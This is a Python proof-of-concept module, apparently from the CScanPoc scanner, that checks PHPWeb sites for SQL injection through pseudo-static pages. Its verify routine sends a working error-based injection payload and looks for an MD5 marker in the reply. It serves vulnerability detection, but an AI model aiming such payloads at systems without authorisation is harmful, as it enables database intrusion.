# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'PHPWeb_0006' # 平台漏洞编号，留空
    name = 'PHPWeb伪静态页面注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2013-01-04'  # 漏洞公布时间
    desc = '''
        PHPWeb伪静态页面注入。
    ''' # 漏洞描述
    ref = 'http://www.myhack58.com/Article/html/3/62/2013/36562.htm' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'PHPWeb'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ab0b0837-a8ef-4b65-88e1-ddecf23bb914'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "page/html/?56'/**/and/**/(SELECT/**/1/**/from/**/(select/**/count(*),concat(floor(rand(0)*2),(substring((select(md5(3.1415))),1,62)))a/**/from/**/information_schema.tables/**/group/**/by/**/a)b)=1/*.html"
            url = arg + payload
            code, head, res, errcode, _ = hh.http('"%s"' % url)
            if code ==200 and "63e1f04640e83605c1d177544a5a0488" in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()